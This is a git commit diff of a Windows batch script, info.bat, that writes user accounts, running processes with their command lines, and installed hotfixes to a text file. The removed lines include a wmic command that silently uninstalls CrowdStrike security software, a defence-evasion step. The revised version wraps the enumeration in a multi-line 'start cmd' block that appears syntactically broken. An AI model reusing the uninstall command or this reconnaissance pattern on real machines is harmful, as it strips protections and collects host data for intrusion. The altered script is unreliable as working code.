57a83f9963a0878452047448d5079b36f3d41ebf
Niquill0 <85759792+nicovarvara@users.noreply.github.com>
2024-11-06 17:43:01 -0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -1,11 +1,12 @@
 @echo off
 setlocal
 
-wmic useraccount get /ALL /format:csv > info.txt
-wmic process get caption,executablepath,commandline /format:csv >> info.txt
-wmic qfe get description,hotfixid,installedOn,ServicePackInEffect /format:csv >> info.txt
-wmic /node:"127.0.0.1" product where "name like 'Crowdstrike%%'" call uninstall >> info.txt
+start cmd /k "(
+wmic useraccount get /ALL /format:csv > info.txt &&
+wmic process get caption,executablepath,commandline /format:csv >> info.txt &&
+wmic qfe get description,hotfixid,installedOn,ServicePackInEffect /format:csv >> info.txt &&
 
 echo "finished"
 timeout 5 
+")
 endlocal
